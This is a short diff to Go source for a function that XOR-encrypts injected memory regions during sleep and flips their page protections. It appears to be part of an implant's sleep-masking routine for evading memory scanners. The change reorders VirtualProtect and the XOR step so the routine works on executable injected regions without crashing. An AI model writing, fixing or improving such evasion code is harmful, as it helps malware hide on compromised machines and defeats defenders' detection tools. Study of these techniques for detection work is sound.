@@ -60,11 +60,14 @@ func (m *Mask) Sleep(d time.Duration) {
 		return // cannot encrypt safely without a key
 	}
 
-	// Save original protections, encrypt, downgrade to RW.
+	// VirtualProtect to RW FIRST (capturing the original protection), THEN
+	// XOR-encrypt. Order matters: a post-inject region is typically
+	// PAGE_EXECUTE_READ (not writable), so XOR'ing before downgrading would
+	// trigger STATUS_ACCESS_VIOLATION.
 	origProtect := make([]uint32, len(m.regions))
 	for i, r := range m.regions {
-		xorRegion(r.Addr, r.Size, key)
 		windows.VirtualProtect(r.Addr, r.Size, windows.PAGE_READWRITE, &origProtect[i])
+		xorRegion(r.Addr, r.Size, key)
 	}
 
 	// Sleep.
